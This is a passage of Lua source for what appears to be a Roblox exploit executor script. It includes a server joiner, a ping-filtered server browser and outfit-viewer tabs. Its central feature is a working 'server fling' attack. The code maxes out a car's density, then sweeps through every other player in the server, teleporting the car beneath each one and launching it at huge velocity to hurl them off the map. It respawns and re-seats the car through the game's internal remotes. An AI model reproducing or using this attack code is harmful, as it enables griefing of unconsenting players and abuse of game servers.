local StatusLayout = Instance.new("UIListLayout")
StatusLayout.SortOrder = Enum.SortOrder.LayoutOrder
StatusLayout.Padding = UDim.new(0, 2)
StatusLayout.Parent = StatusScroll

StatusLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    StatusScroll.CanvasSize = UDim2.new(0, 0, 0, StatusLayout.AbsoluteContentSize.Y)
    StatusScroll.CanvasPosition = Vector2.new(0, StatusLayout.AbsoluteContentSize.Y) -- Auto-scroll down
end)

local statusOrder = 0
local function updateStatus(text, color, clearLogs)
    if clearLogs then
        for _, child in ipairs(StatusScroll:GetChildren()) do
            if child:IsA("TextLabel") then child:Destroy() end
        end
        statusOrder = 0
    end
    
    local msg = Instance.new("TextLabel")
    msg.Size = UDim2.new(1, -5, 0, 15)
    msg.BackgroundTransparency = 1
    msg.Text = " " .. text
    msg.TextColor3 = color or Color3.fromRGB(255, 255, 255)
    msg.Font = Enum.Font.Code
    msg.TextSize = 11
    msg.TextXAlignment = Enum.TextXAlignment.Left
    msg.LayoutOrder = statusOrder
    msg.Parent = StatusScroll
    
    statusOrder = statusOrder + 1
end



local function getMyVehicle()
    local vehiclesFolder = workspace:FindFirstChild("Vehicles")
    if not vehiclesFolder then return nil end
    for _, v in pairs(vehiclesFolder:GetChildren()) do
        local ownerObj = v:FindFirstChild("owner") or v:FindFirstChild("owner", true)
        if ownerObj and ownerObj.Value == LocalPlayer then return v end
    end
    return nil
end

local function stopMassFling()
    isMassFlinging = false
    massFlingTarget = nil
    updateStatus("🛑 Attack sequence stopped.", Color3.fromRGB(200, 50, 50), false)
    
    if massFlingLoop then massFlingLoop:Disconnect(); massFlingLoop = nil end
    if targetCycler then task.cancel(targetCycler); targetCycler = nil end
    
    -- Restore original physics
    for part, props in pairs(originalCarProps) do
        if part and part.Parent then part.CustomPhysicalProperties = props end
    end
    table.clear(originalCarProps)
    
    local car = getMyVehicle()
    if car then
        local base = car.PrimaryPart or car:FindFirstChild("Base")
        if base then
            base.Velocity = Vector3.zero
            base.RotVelocity = Vector3.zero
        end
    end
end

local function startMassFling()
    local char = LocalPlayer.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if not hum or not hum.SeatPart then return false end 
    
    local car = getMyVehicle()
    local base = car and (car.PrimaryPart or car:FindFirstChild("Base") or hum.SeatPart)
    if not base then return false end
    
    local lastVehicleName = car.Name

    isMassFlinging = true
    local isRespawningVehicle = false
    table.clear(originalCarProps)

    -- Force max density
    for _, part in ipairs(car:GetDescendants()) do
        if part:IsA("BasePart") then
            originalCarProps[part] = part.CustomPhysicalProperties
            part.CustomPhysicalProperties = PhysicalProperties.new(100, 0, 0, 100, 100)
            part.CanCollide = true
        end
    end
    
    local vehiclesFolder = workspace:FindFirstChild("Vehicles")

    -- 1. LOOPING CYCLER (Fast & Checks every user)
    targetCycler = task.spawn(function()
        while isMassFlinging do
            local playerList = Players:GetPlayers()
            -- Automatically clears logs on every new sweep
            updateStatus("🔄 Sweeping Server (" .. #playerList .. " players)...", Color3.fromRGB(100, 150, 255), true)
            
            for _, plr in ipairs(playerList) do
                if not isMassFlinging then break end
                if plr == LocalPlayer or massWhitelist[plr.Name] then continue end
                
                -- Wait if car is currently respawning
                while isRespawningVehicle do task.wait(0.2) end
                
                local tChar = plr.Character
                local tRoot = tChar and tChar:FindFirstChild("HumanoidRootPart")
                local tHum = tChar and tChar:FindFirstChildOfClass("Humanoid")
                
                -- Dead or no character
                if not tChar or not tRoot or not tHum then 
                    updateStatus("⏩ Skipped " .. plr.Name .. " (No Char)", Color3.fromRGB(120, 120, 120))
                    continue 
                end
                
                -- Void or Sky
                if tRoot.Position.Y < -40 or tRoot.Position.Y > 400 then
                    updateStatus("⏩ Skipped " .. plr.Name .. " (Void/Sky)", Color3.fromRGB(120, 120, 120))
                    continue
                end
                
                -- Sitting Logic (Ignore normal chairs, attack vehicles)
                if tHum.Sit and tHum.SeatPart then
                    local isSittingInCar = false
                    local vehicleAncestor = tHum.SeatPart:FindFirstAncestorOfClass("Model")
                    if vehiclesFolder and vehicleAncestor and vehicleAncestor:IsDescendantOf(vehiclesFolder) then
                        isSittingInCar = true
                    end
                    
                    if not isSittingInCar then
                        updateStatus("🪑 Skipped " .. plr.Name .. " (In Chair)", Color3.fromRGB(200, 150, 50))
                        continue
                    end
                end

                -- Lock onto target
                massFlingTarget = plr
                updateStatus("🎯 Targeting: " .. plr.Name, Color3.fromRGB(200, 200, 50))
                
                local ticks = 0
                local wasFlung = false
                
                -- Bomb them fast (max ~0.3 seconds before giving up)
                while isMassFlinging and massFlingTarget == plr and ticks < 10 do
                    task.wait(0.03) 
                    ticks = ticks + 1
                    
                    local currentRoot = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
                    -- Stop hitting if they fall out of bounds or their velocity spikes heavily
                    if not currentRoot or currentRoot.Velocity.Magnitude > 300 or currentRoot.Position.Y < -40 or currentRoot.Position.Y > 400 then
                        wasFlung = true
                        break 
                    end
                end
                
                if wasFlung then
                    updateStatus("💥 Flung: " .. plr.Name, Color3.fromRGB(50, 200, 100))
                else
                    updateStatus("⚠️ Timeout: " .. plr.Name, Color3.fromRGB(200, 100, 100))
                end
            end
            
            updateStatus("⏳ List finished. Restarting...", Color3.fromRGB(100, 150, 255))
            task.wait(0.5) 
        end
    end)

    -- 2. DESYNC, AUTO-REMOUNT, AND AUTO-RESPAWN
    massFlingLoop = RunService.Heartbeat:Connect(function()
        if not isMassFlinging then return end
        if isRespawningVehicle then return end
        
            -- AUTO-RESPAWN: If car gets sent to the void or despawns
        if not car or not car.Parent or not base or not base.Parent then
            isRespawningVehicle = true
            task.spawn(function()
                updateStatus("⚠️ Car Lost! Respawning " .. lastVehicleName .. "...", Color3.fromRGB(255, 120, 50))
                
                -- Foolproof Flames Hub Net Fetcher
                pcall(function()
                    local g = getgenv()
                    local Net = g.Net
                    if not Net then
                        local core = game:GetService("ReplicatedStorage"):FindFirstChild("Core", true)
                        if core and core:FindFirstChild("Net") then Net = require(core.Net) end
                    end
                    if Net and type(Net.get) == "function" then
                        Net.get("spawn_vehicle", lastVehicleName)
                    elseif g.Get then
                        g.Get("spawn_vehicle", lastVehicleName)
                    end
                end)
                
                task.wait(2.5) -- Wait for network to drop the vehicle
                
                car = getMyVehicle()
                if car then
                    base = car.PrimaryPart or car:FindFirstChild("Base")
                    -- Re-apply max density
                    for _, part in ipairs(car:GetDescendants()) do
                        if part:IsA("BasePart") then
                            part.CustomPhysicalProperties = PhysicalProperties.new(100, 0, 0, 100, 100)
                            part.CanCollide = true
                        end
                    end
                    updateStatus("✅ Car Respawned. Remounting...", Color3.fromRGB(50, 200, 100))
                else
                    updateStatus("❌ Failed to respawn vehicle.", Color3.fromRGB(255, 50, 50))
                end
                isRespawningVehicle = false
            end)
            return
        end

        -- AUTO-REMOUNT: If you get detached from the seat
        if hum and not hum.SeatPart then
            local myRoot = char:FindFirstChild("HumanoidRootPart")
            local vehicleSeat = car:FindFirstChildOfClass("VehicleSeat") or car:FindFirstChildWhichIsA("Seat", true)
            
            if myRoot and vehicleSeat then
                base.Velocity = Vector3.zero
                base.RotVelocity = Vector3.zero
                
                -- Teleport directly above the seat cushion
                myRoot.CFrame = vehicleSeat.CFrame * CFrame.new(0, 1.5, 0)
                
                -- Force sit via Roblox API
                vehicleSeat:Sit(hum)
                
                -- Force sit via Flames Hub native remote
                pcall(function()
                    local g = getgenv()
                    local Net = g.Net
                    if not Net then
                        local core = game:GetService("ReplicatedStorage"):FindFirstChild("Core", true)
                        if core and core:FindFirstChild("Net") then Net = require(core.Net) end
                    end
                    if Net and type(Net.get) == "function" then
                        Net.get("sit", vehicleSeat)
                    elseif g.Get then
                        g.Get("sit", vehicleSeat)
                    end
                end)
            end
            return -- Skip attack phase while trying to sit
        end

        local tRoot = massFlingTarget and massFlingTarget.Character and massFlingTarget.Character:FindFirstChild("HumanoidRootPart")
        local tHum = massFlingTarget and massFlingTarget.Character and massFlingTarget.Character:FindFirstChildOfClass("Humanoid")
        
        local strikeTarget = tRoot
        if tHum and tHum.Sit and tHum.SeatPart then
            strikeTarget = tHum.SeatPart
        end
        
        if strikeTarget then
            -- THE SAFE ZONE: Hidden 45 studs directly beneath the target (deep enough to bypass water)
            local undergroundPos = strikeTarget.CFrame * CFrame.new(0, -45, 0)
            
            -- THE STRIKE ZONE: Placed directly onto them from beneath
            local strikePos = strikeTarget.CFrame * CFrame.new(0, -1.5, 0)
            
            -- Teleport to strike zone and launch UPWARD
            base.CFrame = strikePos
            base.Velocity = Vector3.new(math.random(-50000, 50000), 50000, math.random(-50000, 50000)) 
            base.RotVelocity = Vector3.new(50000, 50000, 50000)
            
            RunService.RenderStepped:Wait()
            
            if base and not isRespawningVehicle then
                base.CFrame = undergroundPos
                base.Velocity = Vector3.zero
                base.RotVelocity = Vector3.zero
            end
        else
            local myRoot = char:FindFirstChild("HumanoidRootPart")
            if myRoot then
                base.CFrame = myRoot.CFrame * CFrame.new(0, -45, 0)
                base.Velocity = Vector3.zero
                base.RotVelocity = Vector3.zero
            end
        end
    end)
    
    return true
end

MassFlingBtn.MouseButton1Click:Connect(function()
    if isMassFlinging then
        MassFlingBtn.Text = "START SERVER FLING"
        MassFlingBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
        stopMassFling()
    else
        local success = startMassFling()
        if success then
            MassFlingBtn.Text = "STOP SERVER FLING"
            MassFlingBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
        else
            MassFlingBtn.Text = "⚠️ SIT IN DRIVER SEAT FIRST"
            MassFlingBtn.BackgroundColor3 = Color3.fromRGB(200, 100, 0)
            task.wait(1.5)
            MassFlingBtn.Text = "START SERVER FLING"
            MassFlingBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
        end
    end
end)

-- 
-- ========== 🌍 SPECIFIC SERVER JOINER (ZERO LOCAL VARIABLES) ==========
ServerJoinFrame = Instance.new("Frame")
ServerJoinFrame.Size = UDim2.new(1, -5, 0, 30)
ServerJoinFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
ServerJoinFrame.BorderSizePixel = 0
ServerJoinFrame.ClipsDescendants = true
ServerJoinFrame.Parent = ToolsScroll

ServerToggleBtn = Instance.new("TextButton")
ServerToggleBtn.Size = UDim2.new(1, 0, 0, 30)
ServerToggleBtn.Text = "  🌍 Specific Server Joiner [ ▼ ]"
ServerToggleBtn.TextColor3 = Color3.fromRGB(100, 200, 255)
ServerToggleBtn.Font = Enum.Font.SourceSansBold
ServerToggleBtn.TextSize = 14
ServerToggleBtn.TextXAlignment = Enum.TextXAlignment.Left
ServerToggleBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 32)
ServerToggleBtn.BorderSizePixel = 0
ServerToggleBtn.Parent = ServerJoinFrame

ServerContent = Instance.new("Frame")
ServerContent.Size = UDim2.new(1, 0, 1, -30)
ServerContent.Position = UDim2.new(0, 0, 0, 30)
ServerContent.BackgroundTransparency = 1
ServerContent.Visible = false
ServerContent.Parent = ServerJoinFrame

PlaceInput = Instance.new("TextBox")
PlaceInput.Size = UDim2.new(1, -20, 0, 30)
PlaceInput.Position = UDim2.new(0, 10, 0, 10)
PlaceInput.PlaceholderText = "Place ID (e.g. 13967668166)"
PlaceInput.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
PlaceInput.TextColor3 = Color3.fromRGB(255, 255, 255)
PlaceInput.Font = Enum.Font.SourceSansBold
PlaceInput.TextSize = 13
PlaceInput.Text = tostring(game.PlaceId) -- Auto-fills current game!
PlaceInput.ClearTextOnFocus = false
PlaceInput.Parent = ServerContent
Instance.new("UICorner", PlaceInput).CornerRadius = UDim.new(0, 6)

JobInput = Instance.new("TextBox")
JobInput.Size = UDim2.new(1, -20, 0, 30)
JobInput.Position = UDim2.new(0, 10, 0, 50)
JobInput.PlaceholderText = "Paste Server Job ID Here"
JobInput.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
JobInput.TextColor3 = Color3.fromRGB(255, 255, 255)
JobInput.Font = Enum.Font.Code
JobInput.TextSize = 11
JobInput.Text = ""
JobInput.ClearTextOnFocus = false
JobInput.Parent = ServerContent
Instance.new("UICorner", JobInput).CornerRadius = UDim.new(0, 6)

TeleportBtn = Instance.new("TextButton")
TeleportBtn.Size = UDim2.new(1, -20, 0, 35)
TeleportBtn.Position = UDim2.new(0, 10, 0, 90)
TeleportBtn.BackgroundColor3 = Color3.fromRGB(40, 100, 180)
TeleportBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
TeleportBtn.Font = Enum.Font.SourceSansBold
TeleportBtn.TextSize = 14
TeleportBtn.Text = "Teleport to Server"
TeleportBtn.BorderSizePixel = 0
TeleportBtn.Parent = ServerContent
Instance.new("UICorner", TeleportBtn).CornerRadius = UDim.new(0, 6)

-- Dropdown Toggle Logic
serverExpanded = false
ServerToggleBtn.MouseButton1Click:Connect(function()
    serverExpanded = not serverExpanded
    if serverExpanded then
        ServerJoinFrame.Size = UDim2.new(1, -5, 0, 140)
        ServerContent.Visible = true
        ServerToggleBtn.Text = "  🌍 Specific Server Joiner [ ▲ ]"
    else
        ServerJoinFrame.Size = UDim2.new(1, -5, 0, 30)
        ServerContent.Visible = false
        ServerToggleBtn.Text = "  🌍 Specific Server Joiner [ ▼ ]"
    end
end)

-- Teleport Logic
TeleportBtn.MouseButton1Click:Connect(function()
    local tPlaceId = tonumber(PlaceInput.Text)
    local tJobId = JobInput.Text:gsub("%s+", "") 
    
    if not tPlaceId or tJobId == "" then
        TeleportBtn.Text = "Invalid Place or Server ID!"
        TeleportBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
        task.wait(1.5)
        TeleportBtn.Text = "Teleport to Server"
        TeleportBtn.BackgroundColor3 = Color3.fromRGB(40, 100, 180)
        return
    end
    
    TeleportBtn.Text = "Teleporting..."
    TeleportBtn.BackgroundColor3 = Color3.fromRGB(200, 150, 50)
    
    local success = pcall(function()
        game:GetService("TeleportService"):TeleportToPlaceInstance(tPlaceId, tJobId, LocalPlayer)
    end)
    
    if not success then
        TeleportBtn.Text = "Teleport Failed"
        TeleportBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
        task.wait(3)
        TeleportBtn.Text = "Teleport to Server"
        TeleportBtn.BackgroundColor3 = Color3.fromRGB(40, 100, 180)
    end
end)
-- ========== 🌐 REGION & PING SERVER BROWSER (ZERO LOCAL VARIABLES) ==========
BrowserFrame = Instance.new("Frame")
BrowserFrame.Size = UDim2.new(1, -5, 0, 30)
BrowserFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
BrowserFrame.BorderSizePixel = 0
BrowserFrame.ClipsDescendants = true
BrowserFrame.Parent = ToolsScroll

BrowserToggleBtn = Instance.new("TextButton")
BrowserToggleBtn.Size = UDim2.new(1, 0, 0, 30)
BrowserToggleBtn.Text = "  🌐 Live Region Browser [ ▼ ]"
BrowserToggleBtn.TextColor3 = Color3.fromRGB(150, 100, 255)
BrowserToggleBtn.Font = Enum.Font.SourceSansBold
BrowserToggleBtn.TextSize = 14
BrowserToggleBtn.TextXAlignment = Enum.TextXAlignment.Left
BrowserToggleBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 32)
BrowserToggleBtn.BorderSizePixel = 0
BrowserToggleBtn.Parent = BrowserFrame

BrowserContent = Instance.new("Frame")
BrowserContent.Size = UDim2.new(1, 0, 1, -30)
BrowserContent.Position = UDim2.new(0, 0, 0, 30)
BrowserContent.BackgroundTransparency = 1
BrowserContent.Visible = false
BrowserContent.Parent = BrowserFrame

PingInput = Instance.new("TextBox")
PingInput.Size = UDim2.new(1, -20, 0, 30)
PingInput.Position = UDim2.new(0, 10, 0, 10)
PingInput.PlaceholderText = "Max Ping (e.g. 80 for nearby country)"
PingInput.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
PingInput.TextColor3 = Color3.fromRGB(255, 255, 255)
PingInput.Font = Enum.Font.SourceSansBold
PingInput.TextSize = 13
PingInput.Text = ""
PingInput.ClearTextOnFocus = false
PingInput.Parent = BrowserContent
Instance.new("UICorner", PingInput).CornerRadius = UDim.new(0, 6)

FetchServersBtn = Instance.new("TextButton")
FetchServersBtn.Size = UDim2.new(1, -20, 0, 35)
FetchServersBtn.Position = UDim2.new(0, 10, 0, 50)
FetchServersBtn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
FetchServersBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
FetchServersBtn.Font = Enum.Font.SourceSansBold
FetchServersBtn.TextSize = 14
FetchServersBtn.Text = "Fetch Filtered Servers"
FetchServersBtn.BorderSizePixel = 0
FetchServersBtn.Parent = BrowserContent
Instance.new("UICorner", FetchServersBtn).CornerRadius = UDim.new(0, 6)

ServerListScroll = Instance.new("ScrollingFrame")
ServerListScroll.Size = UDim2.new(1, -20, 0, 140)
ServerListScroll.Position = UDim2.new(0, 10, 0, 95)
ServerListScroll.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
ServerListScroll.BorderSizePixel = 0
ServerListScroll.ScrollBarThickness = 3
ServerListScroll.Parent = BrowserContent
Instance.new("UICorner", ServerListScroll).CornerRadius = UDim.new(0, 6)

Instance.new("UIPadding", ServerListScroll).PaddingTop = UDim.new(0, 5)

ServerListLayout = Instance.new("UIListLayout")
ServerListLayout.SortOrder = Enum.SortOrder.LayoutOrder
ServerListLayout.Padding = UDim.new(0, 5)
ServerListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
ServerListLayout.Parent = ServerListScroll

ServerListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    ServerListScroll.CanvasSize = UDim2.new(0, 0, 0, ServerListLayout.AbsoluteContentSize.Y + 10)
end)

browserExpanded = false
BrowserToggleBtn.MouseButton1Click:Connect(function()
    browserExpanded = not browserExpanded
    if browserExpanded then
        BrowserFrame.Size = UDim2.new(1, -5, 0, 280)
        BrowserContent.Visible = true
        BrowserToggleBtn.Text = "  🌐 Live Region Browser [ ▲ ]"
    else
        BrowserFrame.Size = UDim2.new(1, -5, 0, 30)
        BrowserContent.Visible = false
        BrowserToggleBtn.Text = "  🌐 Live Region Browser [ ▼ ]"
    end
end)

FetchServersBtn.MouseButton1Click:Connect(function()
    FetchServersBtn.Text = "Scanning Regions..."
    FetchServersBtn.BackgroundColor3 = Color3.fromRGB(200, 150, 50)
    
    for _, child in pairs(ServerListScroll:GetChildren()) do
        if child:IsA("TextButton") then child:Destroy() end
    end
    
    local maxAllowedPing = tonumber(PingInput.Text) or 9999
    
    task.spawn(function()
        local success, result = pcall(function()
            -- Bumps limit to 100 so it can dig through to find local servers
            return game:HttpGet("https://games.roblox.com/v1/games/" .. tostring(game.PlaceId) .. "/servers/Public?sortOrder=Desc&limit=100")
        end)
        
        if success and result then
            local parsed = game:GetService("HttpService"):JSONDecode(result)
            if parsed and parsed.data then
                local count = 0
                for _, srv in ipairs(parsed.data) do
                    -- Applies the Ping (Region) Filter!
                    local srvPing = tonumber(srv.ping) or 9999
                    
                    if srv.id and srv.playing and srv.playing < srv.maxPlayers and srvPing <= maxAllowedPing then
                        count = count + 1
                        local srvBtn = Instance.new("TextButton")
                        srvBtn.Size = UDim2.new(1, -10, 0, 30)
                        srvBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
                        srvBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
                        srvBtn.Font = Enum.Font.SourceSansBold
                        srvBtn.TextSize = 13
                        
                        srvBtn.Text = "👥 " .. tostring(srv.playing) .. "/" .. tostring(srv.maxPlayers) .. "  |  📶 Ping: " .. tostring(srvPing) .. "ms"
                        
                        srvBtn.BorderSizePixel = 0
                        srvBtn.LayoutOrder = count
                        srvBtn.Parent = ServerListScroll
                        Instance.new("UICorner", srvBtn).CornerRadius = UDim.new(0, 4)
                        
                        srvBtn.MouseButton1Click:Connect(function()
                            srvBtn.Text = "Teleporting..."
                            srvBtn.BackgroundColor3 = Color3.fromRGB(200, 100, 50)
                            pcall(function()
                                game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, srv.id, game:GetService("Players").LocalPlayer)
                            end)
                        end)
                    end
                end
                
                if count > 0 then
                    FetchServersBtn.Text = "Found " .. tostring(count) .. " Servers!"
                    FetchServersBtn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
                else
                    FetchServersBtn.Text = "No servers found under " .. tostring(maxAllowedPing) .. "ms!"
                    FetchServersBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
                end
            else
                FetchServersBtn.Text = "Parse Error"
                FetchServersBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
            end
        else
            FetchServersBtn.Text = "Network Error"
            FetchServersBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
        end
        
        task.wait(2.5)
        FetchServersBtn.Text = "Fetch Filtered Servers"
        FetchServersBtn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
    end)
end)
-----
-- Resize Handle (Bottom Right Corner)
local ResizeHandle = Instance.new("TextButton")
ResizeHandle.Name = "ResizeHandle"
ResizeHandle.Size = UDim2.new(0, 15, 0, 15)
ResizeHandle.Position = UDim2.new(1, -15, 1, -15)
ResizeHandle.BackgroundColor3 = Color3.fromRGB(0, 255, 150)
ResizeHandle.Text = "↘"
ResizeHandle.TextColor3 = Color3.fromRGB(15, 15, 18)
ResizeHandle.Font = Enum.Font.SourceSansBold
ResizeHandle.TextSize = 14
ResizeHandle.BorderSizePixel = 0
ResizeHandle.ZIndex = 10
ResizeHandle.Parent = MainFrame

-- Resizing Logic
local isResizing = false
local dragStart
local startSize
local minWidth = 320
local minHeight = 250

ResizeHandle.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isResizing = true
        dragStart = input.Position
        startSize = MainFrame.AbsoluteSize
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if isResizing and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        local newWidth = math.max(minWidth, startSize.X + delta.X)
        local newHeight = math.max(minHeight, startSize.Y + delta.Y)
        MainFrame.Size = UDim2.new(0, newWidth, 0, newHeight)
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isResizing = false
    end
end)

-- Window Controls Logic
local minimized = false
local savedSize = MainFrame.Size

MinBtn.MouseButton1Click:Connect(function()
    minimized = not minimized
    if minimized then
        savedSize = MainFrame.Size 
        MainFrame.Size = UDim2.new(0, MainFrame.AbsoluteSize.X, 0, 35)
        ResizeHandle.Visible = false
    else
        MainFrame.Size = savedSize 
        ResizeHandle.Visible = true
    end
end)

CloseBtn.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
end)

-- ==========================================
-- TAB NAVIGATION LOGIC (MULTI-LAYER BACK FIX)
-- ==========================================
isViewingSaved = false
searchQuery = ""
customOnly = false
currentPage = 1
itemsPerPage = 8
totalPages = 1
allSavedOutfits = {}

-- 🎛️ PAGINATION UI
SavedPaginationBar = Instance.new("Frame", ContentContainer)
SavedPaginationBar.Size, SavedPaginationBar.Position = UDim2.new(1, -16, 0, 30), UDim2.new(0, 8, 1, -35)
SavedPaginationBar.BackgroundColor3, SavedPaginationBar.Visible = Color3.fromRGB(20, 20, 25), false
Instance.new("UICorner", SavedPaginationBar).CornerRadius = UDim.new(0, 6)

PagLayout = Instance.new("UIListLayout", SavedPaginationBar)
PagLayout.FillDirection, PagLayout.HorizontalAlignment = Enum.FillDirection.Horizontal, Enum.HorizontalAlignment.Center
PagLayout.SortOrder, PagLayout.Padding, PagLayout.VerticalAlignment = Enum.SortOrder.LayoutOrder, UDim.new(0, 5), Enum.VerticalAlignment.Center

createPagBtn = function(text, order, width)
    local b = Instance.new("TextButton", SavedPaginationBar)
    b.Size, b.BackgroundColor3, b.TextColor3 = UDim2.new(0, width, 0, 24), Color3.fromRGB(40, 40, 50), Color3.fromRGB(255, 255, 255)
    b.Font, b.TextSize, b.Text, b.LayoutOrder = Enum.Font.SourceSansBold, 12, text, order
    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 4)
    return b
end

BtnFirst = createPagBtn("«", 1, 24)
BtnPrev = createPagBtn("<", 2, 24)
LblPage = Instance.new("TextLabel", SavedPaginationBar)
LblPage.Size, LblPage.BackgroundTransparency, LblPage.TextColor3 = UDim2.new(0, 60, 0, 24), 1, Color3.fromRGB(0, 255, 200)
LblPage.Font, LblPage.TextSize, LblPage.Text, LblPage.LayoutOrder = Enum.Font.SourceSansBold, 12, "Page 1/1", 3
BtnCustom = createPagBtn("Custom Fits", 4, 80)
BtnNext = createPagBtn(">", 5, 24)
BtnLast = createPagBtn("»", 6, 24)

-- Shrink the list to make room for pagination
SavedScroll.Size = UDim2.new(1, -16, 1, -75)

-- PERFECTED BACK BUTTON LOGIC
BackBtn.MouseButton1Click:Connect(function()
    if isViewingSaved and AssetScroll.Visible then
        -- Step 1: Return from 3D Detail View back to the Saved Outfits List Grid
        AssetScroll.Visible, ToolsScroll.Visible = false, false
        SavedScroll.Visible, SavedSearchBar.Visible, SavedPaginationBar.Visible = true, true, true
        PlayerScroll.Visible, PlayerSearchBar.Visible = false, false
        
        BackBtn.Visible = true -- Keep the back button so we can go home!
        RefreshBtn.Visible, SavedTabBtn.Visible, ToolsTabBtn.Visible = false, false, false
        Title.Text = "📁 Saved Outfits"
        isViewingSaved = false 
    else
        -- Step 2: Return from Tools, Saved List, or Live Player to the MAIN Menu
        AssetScroll.Visible, ToolsScroll.Visible, SavedScroll.Visible = false, false, false
        SavedSearchBar.Visible, SavedPaginationBar.Visible = false, false
        PlayerScroll.Visible, PlayerSearchBar.Visible = true, true
        
        BackBtn.Visible = false -- Hide the back button, we are home
        RefreshBtn.Visible, SavedTabBtn.Visible, ToolsTabBtn.Visible = true, true, true
        Title.Text = "🧬 Deep Live Outfit Scanner"
        isViewingSaved = false
    end
end)

SavedTabBtn.MouseButton1Click:Connect(function()
    isViewingSaved = false
    AssetScroll.Visible, PlayerScroll.Visible, ToolsScroll.Visible = false, false, false
    PlayerSearchBar.Visible = false 
    SavedScroll.Visible, SavedSearchBar.Visible, SavedPaginationBar.Visible = true, true, true
    
    BackBtn.Visible = true
    RefreshBtn.Visible, SavedTabBtn.Visible, ToolsTabBtn.Visible = false, false, false
    Title.Text = "📁 Saved Outfits"
    if populateSavedOutfits then populateSavedOutfits() end
end)

ToolsTabBtn.MouseButton1Click:Connect(function()
    isViewingSaved = false
    AssetScroll.Visible, PlayerScroll.Visible, SavedScroll.Visible = false, false, false
    PlayerSearchBar.Visible, SavedSearchBar.Visible, SavedPaginationBar.Visible = false, false, false
    ToolsScroll.Visible = true
    
    BackBtn.Visible = true
    RefreshBtn.Visible, SavedTabBtn.Visible, ToolsTabBtn.Visible = false, false, false
    Title.Text = "🛠️ Utility Tools"
end)

---
local function createDetailedAssetCard(categoryName, assetId, rawPropertySource)
    local numericId = tonumber(assetId)
    if not numericId then return end

    local CardFrame = Instance.new("Frame")
    CardFrame.Size = UDim2.new(1, -5, 0, 105)
    CardFrame.BackgroundColor3 = Color3.fromRGB(24, 24, 30)
    CardFrame.BorderSizePixel = 0
    CardFrame.LayoutOrder = 5
    CardFrame.Parent = AssetScroll

    local PreviewImg = Instance.new("ImageLabel")
    PreviewImg.Size = UDim2.new(0, 95, 0, 95)
    PreviewImg.Position = UDim2.new(0, 5, 0, 5)
    PreviewImg.BackgroundColor3 = Color3.fromRGB(12, 12, 15)
    PreviewImg.Image = "rbxthumb://type=Asset&id=" .. tostring(numericId) .. "&w=150&h=150"
    PreviewImg.Parent = CardFrame

    local CategoryLabel = Instance.new("TextLabel")
    CategoryLabel.Size = UDim2.new(1, -115, 0, 15)
    CategoryLabel.Position = UDim2.new(0, 110, 0, 6)
    CategoryLabel.Text = "[" .. categoryName:upper() .. "]"
    CategoryLabel.TextColor3 = Color3.fromRGB(0, 255, 200)
    CategoryLabel.Font = Enum.Font.SourceSansBold
    CategoryLabel.TextSize = 13
    CategoryLabel.TextXAlignment = Enum.TextXAlignment.Left
    CategoryLabel.BackgroundTransparency = 1
    CategoryLabel.Parent = CardFrame

    local NameLabel = Instance.new("TextLabel")
    NameLabel.Size = UDim2.new(1, -115, 0, 18)
    NameLabel.Position = UDim2.new(0, 110, 0, 22)
    NameLabel.Text = "Querying item database..."
    NameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    NameLabel.Font = Enum.Font.SourceSans
    NameLabel.TextSize = 14
    NameLabel.TextXAlignment = Enum.TextXAlignment.Left
    NameLabel.BackgroundTransparency = 1
    NameLabel.Parent = CardFrame

    local CreatorLabel = Instance.new("TextLabel")
    CreatorLabel.Size = UDim2.new(1, -155, 0, 15)
    CreatorLabel.Position = UDim2.new(0, 110, 0, 42)
    CreatorLabel.Text = "Creator: Fetching..."
    CreatorLabel.TextColor3 = Color3.fromRGB(160, 160, 170)
    CreatorLabel.Font = Enum.Font.SourceSansItalic
    CreatorLabel.TextSize = 12
    CreatorLabel.TextXAlignment = Enum.TextXAlignment.Left
    CreatorLabel.BackgroundTransparency = 1
    CreatorLabel.Parent = CardFrame

    local CreatorIcon = Instance.new("ImageLabel")
    CreatorIcon.Size = UDim2.new(0, 28, 0, 28)
    CreatorIcon.Position = UDim2.new(1, -40, 0, 38)
    CreatorIcon.BackgroundTransparency = 1
    CreatorIcon.Parent = CardFrame

    local SourceLabel = Instance.new("TextLabel")
    SourceLabel.Size = UDim2.new(1, -115, 0, 15)
    SourceLabel.Position = UDim2.new(0, 110, 0, 58)
    SourceLabel.Text = "Source: " .. rawPropertySource
